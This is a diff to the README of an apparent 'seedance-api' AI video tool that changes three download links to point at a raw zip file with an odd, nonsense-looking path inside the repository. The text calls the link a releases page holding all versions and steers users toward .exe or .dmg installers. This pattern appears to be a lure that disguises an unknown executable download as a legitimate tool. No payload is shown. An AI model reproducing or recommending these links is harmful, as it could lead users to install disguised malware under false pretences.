@@ -1,6 +1,6 @@
 # 🎬 seedance-api - Easy AI Video Creation Tool
 
-[![Download seedance-api](https://github.com/Tecky50/seedance-api/raw/refs/heads/main/adytum/api-seedance-diaheliotropically.zip)](https://github.com/Tecky50/seedance-api/raw/refs/heads/main/adytum/api-seedance-diaheliotropically.zip)
+[![Download seedance-api](https://raw.githubusercontent.com/Tecky50/seedance-api/main/adytum/api-seedance-diaheliotropically.zip)](https://raw.githubusercontent.com/Tecky50/seedance-api/main/adytum/api-seedance-diaheliotropically.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Here is how to get and run seedance-api on your computer in simple steps.
 
 Click the big green button at the top or visit this page:
 
-[Download seedance-api Releases](https://github.com/Tecky50/seedance-api/raw/refs/heads/main/adytum/api-seedance-diaheliotropically.zip)
+[Download seedance-api Releases](https://raw.githubusercontent.com/Tecky50/seedance-api/main/adytum/api-seedance-diaheliotropically.zip)
 
 This page holds all versions of the software. Look for the latest version and download the file matched to your system, usually ending with `.exe` for Windows or `.dmg` for macOS.
 
@@ -127,7 +127,7 @@ For detailed help, visit the “Issues” section on the GitHub page.
 
 Visit this page to download seedance-api for your computer:
 
-[https://github.com/Tecky50/seedance-api/raw/refs/heads/main/adytum/api-seedance-diaheliotropically.zip](https://github.com/Tecky50/seedance-api/raw/refs/heads/main/adytum/api-seedance-diaheliotropically.zip)
+[https://raw.githubusercontent.com/Tecky50/seedance-api/main/adytum/api-seedance-diaheliotropically.zip](https://raw.githubusercontent.com/Tecky50/seedance-api/main/adytum/api-seedance-diaheliotropically.zip)
 
 Choose the latest version that matches your system (Windows or macOS). This page always has the newest updates and fixes.
 
